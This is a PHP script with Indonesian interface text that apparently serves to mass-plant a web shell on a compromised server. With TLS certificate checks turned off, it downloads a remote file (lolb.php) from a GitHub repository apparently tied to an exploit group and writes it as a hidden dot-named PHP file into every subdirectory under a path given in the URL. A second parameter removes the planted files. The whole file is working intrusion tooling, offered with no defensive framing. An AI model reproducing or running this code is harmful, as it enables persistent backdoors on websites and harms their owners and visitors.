<?php
// - Upload: tools.php?dir=/path/to/directory
// - Delete: tools.php?delete=/path/to/directory
error_reporting(0);
set_time_limit(0);

$file_url = "https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/lolb.php";

function downloadFile($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

function deleteUploadedFiles($base_dir) {
    $result = [];
  
    if (!is_dir($base_dir)) {
        return ["error" => "Direktori tidak valid"];
    }
    
    $dir_iterator = new RecursiveDirectoryIterator($base_dir, RecursiveDirectoryIterator::SKIP_DOTS);
    $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
    
    foreach ($iterator as $file) {
        if ($file->isDir()) {
            $dir_path = $file->getPathname();
            $dir_name = basename($dir_path);
            $target_file = $dir_path . '/.' . $dir_name . '.php';
            
            if (file_exists($target_file)) {
                if (unlink($target_file)) {
                    $result['deleted'][] = $target_file;
                } else {
                    $result['failed'][] = $target_file;
                }
            }
        }
    }
    
    return $result;
}

function processDirectories($base_dir) {
    global $file_url;
    
    $result = [];
    
    if (!is_dir($base_dir)) {
        return ["error" => "Direktori tidak valid"];
    }

    $file_content = downloadFile($file_url);
    if (empty($file_content)) {
        return ["error" => "Gagal mendownload file dari URL"];
    }

    $dir_iterator = new RecursiveDirectoryIterator($base_dir, RecursiveDirectoryIterator::SKIP_DOTS);
    $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
    
    foreach ($iterator as $file) {
        if ($file->isDir()) {
            $dir_path = $file->getPathname();
            $dir_name = basename($dir_path);
            $target_file = $dir_path . '/.' . $dir_name . '.php';
            
            if (file_put_contents($target_file, $file_content)) {
                $result['uploaded'][] = $target_file;
            } else {
                $result['failed'][] = $target_file;
            }
        }
    }
    
    return $result;
}

if (isset($_GET['delete']) && !empty($_GET['delete'])) {
    $base_directory = rtrim($_GET['delete'], '/');
    $result = deleteUploadedFiles($base_directory);
    
    echo "<h2>Hasil Delete Massal</h2>";
    echo "<p>Direktori dasar: <strong>$base_directory</strong></p>";
    
    if (isset($result['error'])) {
        echo "<div style='color:red;'>{$result['error']}</div>";
    } else {
        echo "<h3>File Berhasil Dihapus:</h3>";
        echo "<ul>";
        foreach ($result['deleted'] as $file) {
            echo "<li>$file</li>";
        }
        echo "</ul>";
        
        if (!empty($result['failed'])) {
            echo "<h3>File Gagal Dihapus:</h3>";
            echo "<ul>";
            foreach ($result['failed'] as $file) {
                echo "<li>$file</li>";
            }
            echo "</ul>";
        }
    }
} elseif (isset($_GET['dir']) && !empty($_GET['dir'])) {
    $base_directory = rtrim($_GET['dir'], '/');
    $result = processDirectories($base_directory);
    
    echo "<h2>Hasil Upload Massal</h2>";
    echo "<p>Direktori dasar: <strong>$base_directory</strong></p>";
    
    if (isset($result['error'])) {
        echo "<div style='color:red;'>{$result['error']}</div>";
    } else {
        echo "<h3>File Berhasil Diupload:</h3>";
        echo "<ul>";
        foreach ($result['uploaded'] as $file) {
            echo "<li>$file</li>";
        }
        echo "</ul>";
        
        if (!empty($result['failed'])) {
            echo "<h3>File Gagal Diupload:</h3>";
            echo "<ul>";
            foreach ($result['failed'] as $file) {
                echo "<li>$file</li>";
            }
            echo "</ul>";
        }
    }
}
?>
